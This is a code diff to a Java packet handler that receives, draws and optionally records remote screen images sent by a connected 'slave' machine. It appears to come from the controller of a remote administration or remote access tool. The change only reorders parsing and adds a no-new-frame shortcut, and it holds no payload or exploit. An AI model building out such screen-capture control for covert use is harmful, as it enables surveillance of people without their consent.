@@ -39,15 +39,7 @@ public class Packet17RemoteScreen extends AbstractIncomingPacket {
 
 		int mouseX = slave.readInt();
 		int mouseY = slave.readInt();
-
-		int blen = slave.readInt();
-
-		int x = slave.readInt();
-		int y = slave.readInt();
-
-		byte[] buffer = new byte[blen];
-		slave.getDataInputStream().readFully(buffer);
-
+		
 		RemoteScreenData itd = instances.get(slave);
 
 		if (itd == null) {
@@ -55,8 +47,30 @@ public class Packet17RemoteScreen extends AbstractIncomingPacket {
 			instances.put(slave, itd);
 		}
 		BufferedImage bufferedImage = itd.getBufferedImage();
-
+		
 		FrameRemoteScreen frame = FrameRemoteScreen.instances.get(slave);
+		
+		if (dis.readBoolean() && frame != null && frame.running) {
+			System.gc();
+
+			if (frame.record) {
+				new ThreadRemoteScreenRecorder(frame.recorder.getPath(), bufferedImage, frame.recorder.getCount(), frame.recorder.getExtension()).start();
+			}
+			
+			if (requestAgain) {
+				new ThreadImage(frame.getDelay(), slave).start();
+			}
+			return;
+		}
+
+		int x = slave.readInt();
+		int y = slave.readInt();
+		
+		int blen = slave.readInt();
+
+		byte[] buffer = new byte[blen];
+		slave.getDataInputStream().readFully(buffer);
+
 		if (frame != null && frame.running) {
 			try {
 				Graphics imageGraphics = bufferedImage.getGraphics();
@@ -92,9 +106,7 @@ public class Packet17RemoteScreen extends AbstractIncomingPacket {
 
 				frame.getFPSThread().increase();
 
-				if (frame.record) {
-					new ThreadRemoteScreenRecorder(frame.recorder.getPath(), bufferedImage, frame.recorder.getCount(), frame.recorder.getExtension()).start();
-				}
+				
 
 				if (!itd.hasCreatedIcon()) {
 					ImageIcon imageicon = new ImageIcon(bufferedImage);
@@ -102,11 +114,7 @@ public class Packet17RemoteScreen extends AbstractIncomingPacket {
 					itd.setIcon();
 				}
 
-				System.gc();
-
-				if (requestAgain) {
-					new ThreadImage(frame.getDelay(), slave).start();
-				}
+				
 
 			} catch (Exception ex) {
 				ex.printStackTrace();
